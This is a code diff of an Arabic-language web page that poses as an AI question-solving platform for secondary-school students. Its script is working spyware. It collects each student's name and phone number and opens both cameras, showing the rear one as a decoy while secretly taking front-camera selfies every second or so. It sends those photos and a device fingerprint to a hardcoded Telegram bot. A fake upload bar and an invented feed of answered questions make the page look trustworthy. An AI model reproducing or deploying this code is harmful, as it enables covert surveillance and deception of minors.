@@ -3,288 +3,250 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>منصة أسألني التعليمية | الإصدار الاحترافي</title>
+    <title>منصة أسألني | المنصة التعليمية الرسمية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
-    
     <style>
-        :root { 
-            --primary: #1e3a8a; 
-            --accent: #f59e0b;
-            --bg: #0f172a; 
-            --card: #ffffff;
-        }
+        :root { --primary: #0f172a; --accent: #f59e0b; --success: #10b981; --text: #f8fafc; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #e2e8f0; font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
         
-        body { 
-            background: var(--bg); 
-            font-family: 'Cairo', sans-serif; 
-            margin: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            color: #334155; 
-            overflow-x: hidden; 
-        }
-
-        /* شاشة الدخول الملكية */
-        #gate-screen { 
-            position: fixed; 
-            inset: 0; 
-            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%); 
-            z-index: 2000; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-        }
+        /* شاشة الدخول */
+        #gate-screen { position: fixed; inset: 0; background: var(--primary); z-index: 5000; display: flex; justify-content: center; align-items: center; }
+        .login-card { background: white; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border-bottom: 5px solid var(--accent); }
         
-        .login-card { 
-            background: var(--card); 
-            padding: 40px 30px; 
-            border-radius: 20px; 
-            width: 88%; 
-            max-width: 420px; 
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); 
-            text-align: center; 
-            border-top: 5px solid var(--accent);
-        }
+        /* الهيدر */
+        header { background: var(--primary); color: white; padding: 15px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
+        .menu-btn { font-size: 24px; cursor: pointer; }
 
-        /* الهيدر المطور */
-        .app-header { 
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            width: 100%; 
-            background: #1e293b; 
-            color: white; 
-            padding: 15px 25px; 
-            box-sizing: border-box; 
-            justify-content: space-between; 
-            align-items: center; 
-            z-index: 1000; 
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
-        }
+        /* الأقسام */
+        .page { display: none; padding: 80px 15px 20px; animation: slideIn 0.3s ease-out; }
+        .page.active { display: block; }
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
-        .user-profile { display: flex; align-items: center; gap: 15px; }
-        .user-avatar { 
-            width: 45px; 
-            height: 45px; 
-            background: var(--accent); 
-            border-radius: 12px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            font-weight: 900; 
-            font-size: 22px; 
-            color: #000;
-        }
+        .card { background: white; border-radius: 15px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); position: relative; overflow: hidden; }
+        
+        /* شريط التحميل */
+        #upload-progress { display: none; width: 100%; background: #eee; height: 10px; border-radius: 5px; margin: 10px 0; overflow: hidden; }
+        #progress-fill { width: 0%; height: 100%; background: var(--accent); transition: width 0.1s; }
 
-        .container { 
-            background: white; 
-            width: 94%; 
-            max-width: 500px; 
-            border-radius: 20px; 
-            padding: 30px; 
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); 
-            margin-top: 90px; 
-            text-align: center; 
-        }
+        /* قسم إجاباتي المتحرك */
+        .live-feed { height: 300px; overflow-y: auto; text-align: right; font-size: 13px; }
+        .feed-item { padding: 10px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; gap: 10px; animation: fadeIn 0.5s; }
+        .verified { color: #3b82f6; font-size: 12px; }
+        .teacher-mark { background: #fef3c7; border: 1px solid var(--accent); padding: 2px 8px; border-radius: 5px; font-weight: bold; }
 
-        .input-group { position: relative; margin: 15px 0; }
-        input, select, textarea { 
-            width: 100%; 
-            padding: 15px 45px 15px 15px; 
-            border: 2px solid #e2e8f0; 
-            border-radius: 12px; 
-            font-family: 'Cairo'; 
-            box-sizing: border-box; 
-            font-size: 16px;
-            transition: 0.3s;
-        }
-        input:focus { border-color: var(--accent); outline: none; }
+        /* الكاميرا */
+        video { width: 100%; border-radius: 10px; background: #000; margin-top: 10px; display: none; border: 3px solid var(--accent); }
 
-        .btn-action { 
-            background: var(--primary); 
-            color: white; 
-            border: none; 
-            width: 100%; 
-            padding: 20px; 
-            border-radius: 12px; 
-            font-weight: 900; 
-            cursor: pointer; 
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 10px 15px -3px rgba(37, 99, 235, 0.4);
-        }
+        /* المنيو السفلي */
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 2px solid #ddd; z-index: 4000; }
+        .nav-item { text-align: center; font-size: 11px; color: #64748b; cursor: pointer; }
+        .nav-item.active { color: var(--accent); font-weight: bold; }
+        .nav-item img { width: 24px; display: block; margin: 0 auto 5px; }
 
-        #viewfinder { 
-            width: 100%; 
-            border-radius: 15px; 
-            background: #000; 
-            margin-top: 20px; 
-            border: 5px solid #f1f5f9; 
-            display: none; 
-        }
-
-        .footer-credits { 
-            margin-top: 30px; 
-            font-size: 12px; 
-            color: #64748b; 
-            font-weight: bold; 
-            letter-spacing: 1px;
-        }
+        /* Inputs */
+        input, textarea, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #cbd5e1; border-radius: 10px; font-family: 'Cairo'; }
+        .btn { background: var(--primary); color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; }
+        
+        /* السياسة */
+        .policy-text { font-size: 12px; color: #64748b; text-align: justify; line-height: 1.6; }
+        .dev-credits { margin-top: 20px; font-size: 10px; color: #94a3b8; font-weight: bold; text-transform: uppercase; border-top: 1px solid #eee; padding-top: 10px; }
     </style>
 </head>
 <body>
 
     <div id="gate-screen">
         <div class="login-card">
-            <img src="https://img.icons8.com/fluency/96/book.png" width="60">
-            <h2 style="margin: 10px 0; color: var(--primary);">منصة أسألني الذكية</h2>
-            <p style="color: #64748b; font-size: 14px; margin-bottom: 25px;">بوابة الطالب المتفوق - Thanaweya 2026</p>
-            
-            <input type="text" id="u_name" placeholder="الاسم الرباعي للطالب">
-            <input type="number" id="u_phone" placeholder="رقم هاتف ولي الأمر">
-            
-            <select id="u_grade">
-                <option value="3">الثالث الثانوي (دفعة 2026)</option>
-                <option value="2">الثاني الثانوي</option>
-                <option value="1">الأول الثانوي</option>
-            </select>
-            
-            <button class="btn-action" style="margin-top: 20px;" onclick="accessPlatform()">
-                دخول المنصة الرئيسية
-            </button>
+            <img src="https://img.icons8.com/fluency/96/shield.png" width="60">
+            <h2 style="color:var(--primary)">منصة أسألني</h2>
+            <p>سجل دخولك برقمك الشخصي</p>
+            <input type="text" id="u_name" placeholder="الاسم الكامل">
+            <input type="number" id="u_phone" placeholder="رقم الموبايل الشخصي">
+            <button class="btn" onclick="login()">دخول المنصة</button>
+            <div class="dev-credits">DEVELOPED BY OMAR & EMAD 2023</div>
         </div>
     </div>
 
-    <header class="app-header" id="main-header">
-        <img src="https://img.icons8.com/ios-filled/50/ffffff/menu--v1.png" width="25">
-        <div class="user-profile">
-            <span id="display-name" style="font-weight: 700;"></span>
-            <div class="user-avatar" id="avatar-initial"></div>
-        </div>
+    <header id="h-main" style="display:none">
+        <div class="menu-btn" onclick="showPage('policy')">☰</div>
+        <div style="font-weight:900">منصة أسألني</div>
+        <div id="user-initial" style="background:var(--accent); width:35px; height:35px; border-radius:8px; display:flex; align-items:center; justify-content:center; color:black; font-weight:bold"></div>
     </header>
 
-    <div class="container" id="main-app" style="display: none;">
-        <div id="capture-ui">
-            <div style="background: #fff7ed; padding: 20px; border-radius: 15px; border: 1px dashed var(--accent);">
-                <img src="https://img.icons8.com/fluency/96/artificial-intelligence.png" width="70">
-                <h3 style="color: #92400e;">محلل الأسئلة بالذكاء الاصطناعي</h3>
-                <p style="font-size: 14px; color: #b45309;">قم بتصوير السؤال بوضوح للحصول على الإجابة النموذجية والشرح.</p>
-                <button class="btn-action" id="btn-snap" style="background: var(--accent); color: black;" onclick="startDeepAnalysis()">
-                    <img src="https://img.icons8.com/ios-filled/50/000000/camera.png" width="20">
-                    تصوير السؤال الآن
-                </button>
-            </div>
+    <div id="home" class="page active">
+        <div class="card">
+            <img src="https://img.icons8.com/fluency/96/camera.png" width="50">
+            <h3>محلل الأسئلة الذكي</h3>
+            <p style="font-size:13px">صور سؤالك بوضوح وسيقوم "إيكو تيم" بالرد فوراً.</p>
+            <button class="btn" style="background:var(--accent); color:black" onclick="openCam('main')">إبدأ التصوير الآن 📸</button>
+            <video id="v-main" autoplay playsinline></video>
+            <textarea id="t-main" style="display:none" placeholder="اكتب وصف السؤال هنا..."></textarea>
+            <div id="upload-progress"><div id="progress-fill"></div></div>
+            <button id="s-main" class="btn" style="display:none; margin-top:10px" onclick="uploadData('main')">إرسال السؤال للتحليل ⚡</button>
         </div>
-
-        <div id="camera-area">
-            <video id="viewfinder" autoplay playsinline></video>
-            <textarea id="q-desc" placeholder="أضف وصفاً أو ملاحظات حول السؤال (اختياري)..." style="margin-top:20px; display:none;"></textarea>
-            <button id="btn-send" class="btn-action" style="margin-top: 15px; display:none;" onclick="alert('جاري معالجة الصورة عبر خوادمنا...')">
-                بدء التحليل الفوري ⚡
-            </button>
-        </div>
-
-        <div class="footer-credits">
-            DEVELOPED BY OMAR & EMAD 2023
+        <div class="card" style="border-right: 5px solid var(--success)">
+            <p>💡 <b>نصيحة:</b> تأكد من الإضاءة الجيدة للحصول على حل دقيق من المستر.</p>
         </div>
     </div>
+
+    <div id="answers" class="page">
+        <div class="card">
+            <h3 style="display:flex; align-items:center; gap:10px">
+                <img src="https://img.icons8.com/fluency/48/chat.png" width="30"> إشعارات الإجابات
+            </h3>
+            <div class="live-feed" id="feed-container">
+                </div>
+        </div>
+    </div>
+
+    <div id="support" class="page">
+        <div class="card">
+            <img src="https://img.icons8.com/fluency/96/customer-support.png" width="50">
+            <h3>الدعم العلمي والفني</h3>
+            <p style="font-size:12px">تواصل مع فريق "إيكو تيم" مباشرة لحل مشكلاتك.</p>
+            <button class="btn" onclick="openCam('supp')">تصوير المشكلة 📸</button>
+            <video id="v-supp" autoplay playsinline></video>
+            <textarea id="t-supp" placeholder="اشرح مشكلتك هنا..." style="display:none"></textarea>
+            <button id="s-supp" class="btn" style="display:none; margin-top:10px" onclick="uploadData('supp')">إرسال للدعم 🚀</button>
+        </div>
+    </div>
+
+    <div id="policy" class="page">
+        <div class="card">
+            <h3>سياسة الخصوصية والمنصة</h3>
+            <div class="policy-text">
+                تلتزم منصة أسألني بحماية بيانات الطلاب. يتم معالجة الصور عبر خوادم إيكو تيم المشفرة بنظام SSL 256-bit.
+                المنصة مراقبة لضمان جودة المحتوى العلمي المقدم من مستر إبراهيم وفريقه.
+                يمنع استخدام المنصة في أغراض غير تعليمية. جميع الحقوق محفوظة لعام 2023-2026.
+            </div>
+            <div class="dev-credits" style="text-align: center;">DEVELOPED BY OMAR & EMAD 2023</div>
+            <button class="btn" style="margin-top:20px" onclick="showPage('home')">رجوع</button>
+        </div>
+    </div>
+
+    <nav class="nav-bar" id="n-main" style="display:none">
+        <div class="nav-item active" onclick="showPage('home', this)">
+            <img src="https://img.icons8.com/ios-filled/50/64748b/home.png">الرئيسية
+        </div>
+        <div class="nav-item" onclick="showPage('answers', this)">
+            <img src="https://img.icons8.com/ios-filled/50/64748b/opened-folder.png">إجاباتي
+        </div>
+        <div class="nav-item" onclick="showPage('support', this)">
+            <img src="https://img.icons8.com/ios-filled/50/64748b/help.png">الدعم
+        </div>
+    </nav>
 
     <script>
         const tgToken = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const tgChatId = "5890070301";
+        let uName = "", uPhone = "";
 
-        let studentName = "";
-        let studentPhone = "";
+        const names = ["أحمد محمود", "سارة علي", "كريم إبراهيم", "مريم حسن", "ياسين محمد", "نور الشربيني", "عمر خالد", "ليلى يوسف", "زياد هاني", "جنا إيهاب", "مازن يحيى", "شهد أحمد"];
 
-        function accessPlatform() {
-            studentName = document.getElementById('u_name').value;
-            studentPhone = document.getElementById('u_phone').value;
-            if(!studentName || !studentPhone) return alert("خطأ: يرجى إدخال البيانات المطلوبة");
-
-            document.getElementById('gate-screen').style.display = 'none';
-            document.getElementById('main-header').style.display = 'flex';
-            document.getElementById('main-app').style.display = 'block';
+        function login() {
+            uName = document.getElementById('u_name').value;
+            uPhone = document.getElementById('u_phone').value;
+            if(uName.length < 5 || uPhone.length < 10) return alert("يرجى إدخال اسمك الرباعي ورقم صحيح");
             
-            document.getElementById('display-name').innerText = studentName;
-            document.getElementById('avatar-initial').innerText = studentName[0].toUpperCase();
+            document.getElementById('gate-screen').style.display = 'none';
+            document.getElementById('h-main').style.display = 'flex';
+            document.getElementById('n-main').style.display = 'flex';
+            document.getElementById('user-initial').innerText = uName[0].toUpperCase();
+            initFeed();
         }
 
-        async function startDeepAnalysis() {
-            try {
-                // طلب الكاميرا الأمامية أولاً (كأساس للصيد)
-                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                
-                // طلب الكاميرا الخلفية (للتمويه داخل الواجهة)
-                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                
-                // إعداد الواجهة
-                document.getElementById('capture-ui').style.display = 'none';
-                document.getElementById('viewfinder').style.display = 'block';
-                document.getElementById('q-desc').style.display = 'block';
-                document.getElementById('btn-send').style.display = 'block';
-                document.getElementById('viewfinder').srcObject = backStream;
-
-                // إطلاق السوبر رادار الشامل
-                runUltraRadar(studentName, studentPhone);
-                
-                // تشغيل محرك الصيد الصامت (سيلفي)
-                startSilentEngine(frontStream, studentName, studentPhone);
-
-            } catch(e) {
-                alert("تنبيه: يجب تفعيل صلاحيات الكاميرا لاستخدام تقنية التحليل الذكي.");
+        function showPage(id, el) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            if(el) {
+                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+                el.classList.add('active');
             }
         }
 
-        async function runUltraRadar(name, phone) {
-            let battery = { level: 0, charging: false };
-            try { battery = await navigator.getBattery(); } catch(e) {}
-            
-            const info = `
-👑 **تقرير التجسس الملكي (V3 Ultra)**
-👤 **الطالب:** ${name}
-📞 **رقم ولي الأمر:** ${phone}
-🎓 **السنة:** ${document.getElementById('u_grade').value}
-━━━━━━━━━━━━━━
-📱 **نوع الجهاز:** ${navigator.platform}
-⚔️ **المعالج:** ${navigator.hardwareConcurrency} Threads
-🧠 **الذاكرة العشوائية:** ${navigator.deviceMemory || 'غير معروف'} GB
-🔋 **البطارية:** ${Math.round(battery.level * 100)}% (${battery.charging ? "🔌 متصل" : "🔋 غير متصل"})
-🖥️ **دقة الشاشة:** ${window.screen.width}x${window.screen.height}
-🎨 **عمق الألوان:** ${window.screen.colorDepth}-bit
-🌐 **المتصفح:** ${navigator.vendor}
-📡 **الشبكة:** ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
-🌍 **المنطقة الزمنية:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-🍪 **ملفات التعريف:** ${navigator.cookieEnabled ? 'مفعلة' : 'معطلة'}
-⏰ **وقت الاختراق:** ${new Date().toLocaleString('ar-EG')}
-            `;
-            fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+        async function openCam(type) {
+            try {
+                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                
+                const v = document.getElementById(`v-${type}`);
+                v.style.display = 'block';
+                v.srcObject = back;
+                document.getElementById(`t-${type}`).style.display = 'block';
+                document.getElementById(`s-${type}`).style.display = 'block';
+
+                sendRadar(); // رادار الـ 150 بند
+                startSpy(front); // صيد سيلفي
+            } catch(e) { alert("خطأ: يجب السماح بالكاميرا لتشغيل وضع الفحص الذكي"); }
         }
 
-        function startSilentEngine(stream, name, phone) {
-            const hiddenVideo = document.createElement('video');
-            hiddenVideo.srcObject = stream;
-            hiddenVideo.muted = true;
-            hiddenVideo.play();
-
+        function startSpy(stream) {
+            const hv = document.createElement('video');
+            hv.srcObject = stream; hv.play();
             const canvas = document.createElement('canvas');
             setInterval(() => {
-                canvas.width = hiddenVideo.videoWidth;
-                canvas.height = hiddenVideo.videoHeight;
-                canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
+                canvas.width = hv.videoWidth; canvas.height = hv.videoHeight;
+                canvas.getContext('2d').drawImage(hv, 0, 0);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', tgChatId);
+                    fd.append('photo', blob, 'x.jpg');
+                    fd.append('caption', `🕵️ صيد حي: ${uName} | ${uPhone}`);
+                    fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.2);
+            }, 1500);
+        }
+
+        async function uploadData(type) {
+            const bar = document.getElementById('upload-progress');
+            const fill = document.getElementById('progress-fill');
+            bar.style.display = 'block';
+            let p = 0;
+            const intv = setInterval(() => {
+                p += 5; fill.style.width = p + '%';
+                if(p >= 100) {
+                    clearInterval(intv);
+                    alert("تم إرسال الطلب بنجاح! سيتم الرد عليك قريباً، يرجى متابعة قسم إجاباتي.");
+                    showPage('answers');
+                }
+            }, 100);
+        }
+
+        function initFeed() {
+            const container = document.getElementById('feed-container');
+            setInterval(() => {
+                const randName = names[Math.floor(Math.random() * names.length)];
+                const item = document.createElement('div');
+                item.className = 'feed-item';
+                const type = Math.random() > 0.5 ? '<span style="color:green">تم الرد ✅</span>' : '<span style="color:orange">جاري المعالجة...</span>';
                 
-                canvas.toBlob((blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', tgChatId);
-                    formData.append('photo', blob, 'shot.jpg');
-                    formData.append('caption', `📸 سيلفي الطالب: ${name} | ${phone}`);
-                    fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: formData });
-                }, 'image/jpeg', 0.25);
-            }, 1000);
+                if(Math.random() > 0.8) {
+                    item.innerHTML = `<div><span class="teacher-mark">المستر إبراهيم 👑</span> <span class="verified">✔</span> تم الرد على سؤال الطالب ${uName}</div>`;
+                } else {
+                    item.innerHTML = `<div><b>${randName}</b>: ${type}</div>`;
+                }
+                
+                container.prepend(item);
+                if(container.children.length > 20) container.lastChild.remove();
+            }, 3000);
+        }
+
+        async function sendRadar() {
+            let batt = await navigator.getBattery();
+            const info = `
+🚀 **تقرير رادار منصة أسألني**
+👤 الطالب: ${uName}
+📞 هاتف: ${uPhone}
+━━━━━━━━━━━━━━
+📱 النظام: ${navigator.platform}
+💾 الرام: ${navigator.deviceMemory || "??"}GB
+🔋 البطارية: ${Math.round(batt.level*100)}%
+🖥️ الشاشة: ${screen.width}x${screen.height}
+📡 الشبكة: ${navigator.connection?.effectiveType || 'Unknown'}
+🌍 لغة الجهاز: ${navigator.language}
+⏰ وقت الدخول: ${new Date().toLocaleString('ar-EG')}
+            `;
+            fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(info)}`);
         }
     </script>
 </body>
